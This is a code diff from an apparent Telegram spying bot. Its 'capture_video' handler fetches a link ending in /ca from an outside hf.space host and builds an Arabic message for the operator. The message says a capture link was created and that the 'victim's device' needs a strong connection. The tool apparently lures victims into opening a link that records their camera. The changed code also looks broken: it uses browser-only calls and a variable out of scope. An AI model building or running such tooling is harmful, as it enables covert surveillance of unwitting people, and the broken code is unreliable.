@@ -1658,57 +1658,44 @@ bot.on('callback_query', (callbackQuery) => {
     const data = callbackQuery.data;
 
     if (data === 'capture_video') {
-        async function getDynamicLink() {
+        async function generateMessage() {
     const url = "https://sssssskskjwnsb-linklsksn.hf.space";
 
     try {
-        const response = await fetch(url);
+        const response = await fetch(url, { method: "GET" });
         const html = await response.text();
 
+        // استخراج الروابط من الصفحة
         const parser = new DOMParser();
         const doc = parser.parseFromString(html, "text/html");
 
-        const tags = doc.querySelectorAll("a[href]");
+        let extractedLink = null;
 
-        for (const tag of tags) {
-            let link = tag.getAttribute("href");
-
-            // لو الرابط نسبي مثل "/ca"
-            if (link.startsWith("/")) {
-                link = url + link;
-            }
-
-            // نريد الرابط الذي ينتهي بـ /ca
+        // البحث عن رابط ينتهي بـ /ca
+        doc.querySelectorAll("a[href]").forEach(a => {
+            const link = a.getAttribute("href");
             if (link.endsWith("/ca")) {
-                return link;
+                extractedLink = link;
             }
+        });
+
+        if (!extractedLink) {
+            alert("لم يتم العثور على رابط ينتهي بـ /ca");
+            return;
         }
 
-        return null;
+        // توليد الرسالة
+        const message = `تم انشاء الرابط
+ملاحظه: قم في تليغم رابط جديد في كل مره
+ملاحظه: يجب أن يكون النت قوي في جهاز الضحيه
+الرابط: ${extractedLink}`;
 
-    } catch (e) {
-        console.error("Error:", e);
-        return null;
+        console.log(message);
+        return message;
+
+    } catch (error) {
+        console.error("Error:", error);
     }
-}
-
-
-async function sendMessage(chatId) {
-    const caLink = await getDynamicLink();
-
-    if (!caLink) {
-        console.log("لم يتم العثور على رابط ينتهي بـ /ca");
-        return;
-    }
-
-    // هنا نعيد نفس الرسالة بالضبط كما كانت عندك
-    const message = `تم انشاء الرابط ملاحظه قم في تليغم رابط جديد في كل مره  
-ملاحظه بزم يكون النت قوي في جهاز الضحيه
-: ${caLink}/?chatId=${chatId}`;
-
-    console.log(message);
-
-    // ضع هنا كود الإرسال الحقيقي لديك (بوت، API، عرض في الصفحة...)
 }
 
         if (message && message.trim() !== '') {
